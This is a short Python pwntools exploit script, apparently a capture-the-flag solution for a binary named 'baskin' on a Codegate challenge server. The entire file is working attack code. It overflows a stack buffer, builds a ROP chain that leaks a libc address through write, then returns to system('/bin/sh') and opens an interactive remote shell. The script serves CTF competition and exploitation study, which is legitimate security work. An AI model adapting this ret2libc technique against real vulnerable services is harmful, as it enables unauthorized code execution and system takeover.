#!/usr/bin/python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
local = False
elf = ELF('baskin')

if local:
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  p = process('baskin')
else:
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  p = remote('ch41l3ng3s.codegate.kr', 3131)

p.recvuntil('1-3)')

setarg = 0x40087a

#gdb.attach(p, 'b*0x400979\n')

pay = '1\x00'
pay = pay.ljust(0xb8, 'a')
pay += p64(setarg) + p64(1) + p64(0x602018) + p64(8)
pay += p64(elf.plt['write'])
pay += p64(elf.symbols['main'])

p.sendline(pay)
p.recvn(len(pay)+4)
libcbase = u64(p.recvn(6).ljust(8, '\x00')) - libc.symbols['putchar']

print 'LIBC :', hex(libcbase)

binsh = libcbase + next(libc.search('/bin/sh'))
system = libcbase + libc.symbols['system']

pay = '1\x00'
pay = pay.ljust(0xb8, 'a')
pay += p64(setarg) + p64(binsh) + p64(0)*2
pay += p64(system)
p.sendline(pay)

p.interactive()
